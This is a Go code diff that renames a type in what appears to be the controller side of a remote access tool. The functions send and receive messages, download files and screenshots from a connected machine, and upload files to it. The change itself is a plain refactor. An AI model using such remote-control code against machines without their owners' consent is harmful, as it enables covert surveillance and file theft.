@@ -10,7 +10,7 @@ import (
 
 const buffsize = 4096
 
-func (c *client) recv() ([]byte, error) {
+func (c *activeClient) recv() ([]byte, error) {
 	var size int64
 	err := binary.Read(c.Conn, binary.LittleEndian, &size)
 	if err != nil {
@@ -36,7 +36,7 @@ func (c *client) recv() ([]byte, error) {
 	return fullbuff, nil
 }
 
-func (c *client) recvSt() (string, error) {
+func (c *activeClient) recvSt() (string, error) {
 	recv, err := c.recv()
 	if err != nil {
 		return "", err
@@ -44,7 +44,7 @@ func (c *client) recvSt() (string, error) {
 	return string(recv), nil
 }
 
-func (c *client) send(data []byte) error {
+func (c *activeClient) send(data []byte) error {
 	size := len(data)
 	err := binary.Write(c.Conn, binary.LittleEndian, int64(size))
 	if err != nil {
@@ -57,11 +57,11 @@ func (c *client) send(data []byte) error {
 
 }
 
-func (c *client) sendSt(cmdout string) error {
+func (c *activeClient) sendSt(cmdout string) error {
 	return c.send([]byte(cmdout))
 }
 
-func (c *client) getFile(filename string) error {
+func (c *activeClient) getFile(filename string) error {
 	if filename == "screen" {
 		c.sendSt("screen")
 		filename = getTimeSt() + ".png"
@@ -75,7 +75,7 @@ func (c *client) getFile(filename string) error {
 	if string(data) == "err" {
 		return errors.New("[!] File does not exist or permission denied")
 	}
-	path := filepath.Join(c.Path, filename)
+	path := filepath.Join(c.Client.Path, filename)
 	err = ioutil.WriteFile(path, data, 0666)
 	if err != nil {
 		return err
@@ -83,7 +83,7 @@ func (c *client) getFile(filename string) error {
 	return nil
 }
 
-func (c *client) sendFile(filename string) error {
+func (c *activeClient) sendFile(filename string) error {
 	c.sendSt("up " + filename)
 	content, err := ioutil.ReadFile(filename)
 	if err != nil {
